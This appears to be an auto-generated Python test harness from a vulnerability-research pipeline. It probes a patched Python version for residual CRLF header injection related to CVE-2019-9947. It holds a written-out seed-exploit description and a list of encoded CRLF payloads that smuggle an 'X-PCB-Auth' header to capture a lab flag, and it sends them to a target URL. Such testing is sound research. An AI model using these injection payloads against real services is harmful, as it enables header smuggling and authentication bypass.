[GIVEN] CVE-2019-9947 seed exploit -- CRLF header injection via the URL PATH.

The attacker controls the URL passed to urllib.request.urlopen(). Before the
CVE-2019-9947 fix, http.client put the URL path straight into the request line
(`GET <path> HTTP/1.1`) with no control-character check, so a path containing
` HTTP/1.1\\r\\nX-PCB-Auth: ...` splits the request line and smuggles an extra
header into the outgoing request. The trailing `Z:` dummy header absorbs the
`' HTTP/1.1'` that http.client appends after the URL, so the injected
`X-PCB-Auth` line is emitted cleanly.

  V0 python 3.7.2: no _validate_path  -> path CRLF accepted -> X-PCB-Auth reaches
                   the sidecar -> ${PCB_FLAG} (seed reaches).
  V1 python 3.7.4: _validate_path rejects control chars in the URL (CVE-2019-9947
                   fix) -> InvalidURL raised -> BLOCKED (seed closed).

The residual (host-component variant) is the SAME sink area (http.client
putrequest / the _contains_disallowed_url_pchar_re control-char check) but a
component the CVE-2019-9947 fix left unguarded -- see _heldout/bypass_poc.py.

"""Residual test: auto-generated by static pipeline.

Path: http://{ip}:{port}/x HTTP/1.1\r\nX-PCB-Auth: {s}\r\nZ:
Method: GET
O obligations: []
O removed: []
N limit: 4
A_paper version: 1.0
"""

import os
import sys
import json
import urllib.request
import urllib.error

BASE_URL = os.environ.get("BASE_URL", "http://localhost:8080")
MARKER = os.environ.get("MARKER", "")
MAX_ATTEMPTS = 4

# Obligation set from AST diff
O_ADDED = []
O_REMOVED = []

# A_paper candidates (encoding families on dangerous spans)
A_PAPER = [
    "%68%74%74%70%3A%2F%2F%7B%69%70%7D%3A%7B%70%6F%72%74%7D%2F%78%20%48%54%54%50%2F%31%2E%31%5C%72%5C%6E%58%2D%50%43%42%2D%41%75%74%68%3A%20%7B%73%7D%5C%72%5C%6E%5A%3A",  # percent-full
    "%2568%2574%2574%2570%253A%252F%252F%257B%2569%2570%257D%253A%257B%2570%256F%2572%2574%257D%252F%2578%2520%2548%2554%2554%2550%252F%2531%252E%2531%255C%2572%255C%256E%2558%252D%2550%2543%2542%252D%2541%2575%2574%2568%253A%2520%257B%2573%257D%255C%2572%255C%256E%255A%253A",  # double-percent-full
    "http://{ip}:{port}/x HTTP/1.1\r\nX-PCB-Auth: {s}\r\nZ:",  # html-numeric-full
    "http%3A//{ip}:{port}/x HTTP/1.1\\r\\nX-PCB-Auth: {s}\\r\\nZ:",  # percent@4
    "http%253A//{ip}:{port}/x HTTP/1.1\\r\\nX-PCB-Auth: {s}\\r\\nZ:",  # double-percent@4
    "http%C0%BA//{ip}:{port}/x HTTP/1.1\\r\\nX-PCB-Auth: {s}\\r\\nZ:",  # overlong-utf8-2@4
    "http%E0%80%BA//{ip}:{port}/x HTTP/1.1\\r\\nX-PCB-Auth: {s}\\r\\nZ:",  # overlong-utf8-3@4
    "http\\u003A//{ip}:{port}/x HTTP/1.1\\r\\nX-PCB-Auth: {s}\\r\\nZ:",  # unicode-escape@4
    "http://{ip}:{port}/x HTTP/1.1\\r\\nX-PCB-Auth: {s}\\r\\nZ:",  # html-numeric@4
    "http://{ip}:{port}/x HTTP/1.1\\r\\nX-PCB-Auth: {s}\\r\\nZ:",  # html-hex@4
    "http\\x3A//{ip}:{port}/x HTTP/1.1\\r\\nX-PCB-Auth: {s}\\r\\nZ:",  # backslash@4
    "http:%2F/{ip}:{port}/x HTTP/1.1\\r\\nX-PCB-Auth: {s}\\r\\nZ:",  # percent@5
]

# A_code candidates (source literals)
A_CODE = [
    "[\\x00-\\x20\\x7f]",  # O:new_string:Lib/http/client.py
    "\\x00",  # O:new_string:Lib/http/client.py
    "URL can't contain control characters. ",  # O:new_string:Lib/http/client.py
    "(found at least ",  # O:new_string:Lib/http/client.py
    ")",  # O:new_string:Lib/http/client.py
    "ssl module required",  # O:new_string:Lib/test/test_urllib.py
    "//localhost:7777/test",  # O:new_string:Lib/test/test_urllib.py
    "/",  # O:new_string:Lib/test/test_urllib.py
    "HTTP/1.1 200 OK\\r\\n\\r\\nHello.",  # O:new_string:Lib/test/test_urllib.py
    "\\r",  # O:new_string:Lib/test/test_urllib.py
    "\\\\",  # O:new_string:Lib/test/test_urllib.py
    "r'\\\\'",  # O:new_string:Lib/test/test_urllib.py
]

SIBLINGS = []


def probe(candidate_value: str) -> dict:
    """Send a black-box probe to V1 via GET http://{ip}:{port}/x HTTP/1.1\r\nX-PCB-Auth: {s}\r\nZ:."""
    url = BASE_URL.rstrip("/") + candidate_value
    req = urllib.request.Request(url, method="GET")
    req.add_header("User-Agent", "residual-test/1.0")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            headers = dict(resp.headers)
            return {"status": resp.status, "body": body, "headers": headers}
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return {"status": e.code, "body": body, "headers": dict(e.headers)}
    except Exception as e:
        return {"status": "error", "body": str(e), "headers": {}}


def check_effect(response: dict) -> dict:
    """Check if the external effect marker appears in response."""
    body = response.get("body", "")
    headers = response.get("headers", {})
    
    # Check body for marker
    if MARKER and MARKER in body:
        return {"found": True, "location": "body", "marker": MARKER}
    
    # Check headers for marker
    for hname, hval in headers.items():
        if MARKER and MARKER in str(hval):
            return {"found": True, "location": f"header:{hname}", "marker": MARKER}
    
    return {"found": False}


def run():
    """Run candidates against V1, up to N attempts."""
    witnesses = []
    attempts = 0
    
    all_candidates = []
    for c in A_PAPER:
        all_candidates.append(("a_paper", c))
    for c in A_CODE:
        all_candidates.append(("a_code", c))
    for c in SIBLINGS:
        all_candidates.append(("sibling", c))
    
    for source, candidate in all_candidates:
        if attempts >= MAX_ATTEMPTS:
            break
        
        attempts += 1
        resp = probe(candidate)
        effect = check_effect(resp)
        
        result = {
            "candidate": candidate,
            "source": source,
            "status": resp["status"],
            "effect": effect,
        }
        
        if effect.get("found"):
            # Check obligation binding
            bound_o = None
            for o_lit in O_ADDED + O_REMOVED:
                if o_lit in candidate or any(o_lit in str(v) for v in [candidate]):
                    bound_o = o_lit
                    break
            result["obligation_binding"] = bound_o
            result["verdict"] = "witness" if bound_o else "effect_only"
            witnesses.append(result)
        else:
            result["verdict"] = "no_effect"
    
    return {
        "attempts": attempts,
        "witnesses": witnesses,
        "total_candidates": len(all_candidates),
    }


if __name__ == "__main__":
    if not MARKER:
        print("Warning: MARKER not set", file=sys.stderr)
    result = run()
    print(json.dumps(result, indent=2))
